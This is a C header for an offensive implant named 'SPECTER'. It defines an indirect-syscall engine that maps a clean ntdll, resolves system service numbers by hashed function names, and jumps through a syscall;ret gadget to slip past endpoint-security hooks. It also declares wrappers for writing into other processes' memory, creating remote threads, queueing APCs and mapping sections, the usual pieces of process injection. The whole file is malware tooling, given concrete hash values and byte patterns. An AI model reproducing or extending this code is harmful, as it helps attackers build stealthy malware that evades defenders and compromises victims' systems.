/**
 * SPECTER Implant — Syscall Engine Interface
 *
 * Dynamic SSN resolution from a clean ntdll copy with indirect
 * syscall execution through code caves.  No static imports.
 */

#ifndef SYSCALLS_H
#define SYSCALLS_H

#include "specter.h"
#include "ntdefs.h"

/* ------------------------------------------------------------------ */
/*  Syscall table structures                                           */
/* ------------------------------------------------------------------ */

#define SYSCALL_TABLE_CAPACITY 50

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;           /* System Service Number */
    PVOID syscall_addr;  /* Address of syscall;ret gadget in ntdll */
    DWORD hash;          /* DJB2 hash of the Nt* function name */
} SYSCALL_ENTRY;

typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY entries[SYSCALL_TABLE_CAPACITY];
    DWORD         count;
    PVOID         clean_ntdll;  /* Mapped clean ntdll base */
} SYSCALL_TABLE;

/* ------------------------------------------------------------------ */
/*  DJB2 hashes for required Nt* functions                             */
/* ------------------------------------------------------------------ */

#define HASH_NTALLOCATEVIRTUALMEMORY    0xC66D2FCC
#define HASH_NTPROTECTVIRTUALMEMORY     0x191EC748
#define HASH_NTFREEVIRTUALMEMORY        0xF429F469
#define HASH_NTWRITEVIRTUALMEMORY       0x1423FC12
#define HASH_NTREADVIRTUALMEMORY        0x6F4FAF63
#define HASH_NTCREATETHREADEX           0x41F2B1B0
#define HASH_NTOPENPROCESS              0x86C330B8
#define HASH_NTCLOSE                    0x2D18BB7D
#define HASH_NTMAPVIEWOFSECTION         0x873F020A
#define HASH_NTUNMAPVIEWOFSECTION       0xBBB10D4D
#define HASH_NTCREATEFILE               0xB575493B
#define HASH_NTQUERYINFORMATIONPROCESS  0xBBFF10E2
#define HASH_NTSETINFORMATIONTHREAD     0xD471A2B1
#define HASH_NTDELAYEXECUTION           0x888318AA
#define HASH_NTWAITFORSINGLEOBJECT      0x5B5856DC
#define HASH_NTQUEUEAPCTHREAD           0x9D4046B8
#define HASH_NTOPENSECTION              0x4E8F13AE
#define HASH_NTRESUMETHREAD             0x8C5D4E2A
#define HASH_NTTERMINATETHREAD          0xFE883FB3
#define HASH_NTREADFILE                 0x39EA4E27
#define HASH_NTWRITEFILE                0x2E475AB7
#define HASH_NTCREATENAMEDPIPEFILE      0xBF0D4289
#define HASH_NTFSCONTROLFILE            0xCBD6E982
#define HASH_NTTESTALERT                0xB67D903F
#define HASH_NTCREATESECTION            0xC441B530
#define HASH_NTCONTINUE                 0x819B886C

/* ------------------------------------------------------------------ */
/*  Syscall engine API                                                  */
/* ------------------------------------------------------------------ */

/**
 * Initialize the syscall table.  Maps a clean copy of ntdll from
 * \KnownDlls\ntdll.dll, walks its exports to extract SSNs, and
 * locates a syscall;ret gadget for indirect invocation.
 * Returns STATUS_SUCCESS on success.
 */
NTSTATUS sc_init(SYSCALL_TABLE *table);

/**
 * Resolve the SSN for a given function hash from the clean ntdll.
 * Reads the stub pattern: 4C 8B D1 B8 XX XX 00 00
 * Returns -1 on failure.
 */
DWORD sc_resolve_ssn(PVOID clean_ntdll, DWORD func_hash);

/**
 * Find a `syscall; ret` (0F 05 C3) gadget in ntdll's .text section.
 * Returns NULL if not found.
 */
PVOID sc_find_gadget(PVOID clean_ntdll);

/**
 * Look up a SYSCALL_ENTRY by function hash from the cached table.
 * Returns NULL if the entry was not resolved.
 */
SYSCALL_ENTRY *sc_get_entry(SYSCALL_TABLE *table, DWORD func_hash);

/* ------------------------------------------------------------------ */
/*  Indirect syscall stub (defined in asm/syscall_stub.S)               */
/* ------------------------------------------------------------------ */

/**
 * Execute an indirect syscall.  Moves SSN into EAX, copies RCX→R10,
 * and jumps to the syscall_addr gadget inside ntdll.
 *
 * Prototype: spec_syscall(SSN, syscall_addr, arg1..argN)
 * Up to 12 arguments supported beyond SSN and syscall_addr.
 */
extern NTSTATUS spec_syscall(DWORD ssn, PVOID syscall_addr, ...);

/* ------------------------------------------------------------------ */
/*  Convenience wrappers                                                */
/* ------------------------------------------------------------------ */

NTSTATUS spec_NtAllocateVirtualMemory(HANDLE process, PVOID *base,
    ULONG_PTR zero_bits, PSIZE_T size, ULONG alloc_type, ULONG protect);

NTSTATUS spec_NtProtectVirtualMemory(HANDLE process, PVOID *base,
    PSIZE_T size, ULONG new_protect, PULONG old_protect);

NTSTATUS spec_NtFreeVirtualMemory(HANDLE process, PVOID *base,
    PSIZE_T size, ULONG free_type);

NTSTATUS spec_NtWriteVirtualMemory(HANDLE process, PVOID base,
    PVOID buffer, SIZE_T size, PSIZE_T written);

NTSTATUS spec_NtReadVirtualMemory(HANDLE process, PVOID base,
    PVOID buffer, SIZE_T size, PSIZE_T read_bytes);

NTSTATUS spec_NtCreateThreadEx(PHANDLE thread, ULONG access,
    POBJECT_ATTRIBUTES oa, HANDLE process, PVOID start,
    PVOID param, ULONG flags, SIZE_T zero_bits,
    SIZE_T stack_size, SIZE_T max_stack_size, PVOID attr_list);

NTSTATUS spec_NtOpenProcess(PHANDLE process, ULONG access,
    POBJECT_ATTRIBUTES oa, PCLIENT_ID cid);

NTSTATUS spec_NtClose(HANDLE handle);

NTSTATUS spec_NtMapViewOfSection(HANDLE section, HANDLE process,
    PVOID *base, ULONG_PTR zero_bits, SIZE_T commit_size,
    PLARGE_INTEGER offset, PSIZE_T view_size,
    SECTION_INHERIT inherit, ULONG alloc_type, ULONG protect);

NTSTATUS spec_NtUnmapViewOfSection(HANDLE process, PVOID base);

NTSTATUS spec_NtOpenSection(PHANDLE section, ULONG access,
    POBJECT_ATTRIBUTES oa);

NTSTATUS spec_NtCreateFile(PHANDLE file, ULONG access,
    POBJECT_ATTRIBUTES oa, PIO_STATUS_BLOCK iosb,
    PLARGE_INTEGER alloc_size, ULONG file_attr,
    ULONG share_access, ULONG disposition,
    ULONG create_options, PVOID ea_buffer, ULONG ea_length);

NTSTATUS spec_NtQueryInformationProcess(HANDLE process,
    PROCESSINFOCLASS info_class, PVOID info, ULONG info_length,
    PULONG return_length);

NTSTATUS spec_NtDelayExecution(BOOL alertable, PLARGE_INTEGER interval);

NTSTATUS spec_NtWaitForSingleObject(HANDLE handle, BOOL alertable,
    PLARGE_INTEGER timeout);

NTSTATUS spec_NtQueueApcThread(HANDLE thread, PVOID apc_routine,
    PVOID arg1, PVOID arg2, PVOID arg3);

NTSTATUS spec_NtTestAlert(void);

NTSTATUS spec_NtCreateSection(PHANDLE section, ULONG access,
    POBJECT_ATTRIBUTES oa, PLARGE_INTEGER max_size,
    ULONG page_protect, ULONG alloc_attributes, HANDLE file);

NTSTATUS spec_NtContinue(PVOID context, BOOL raise_alert);

#endif /* SYSCALLS_H */
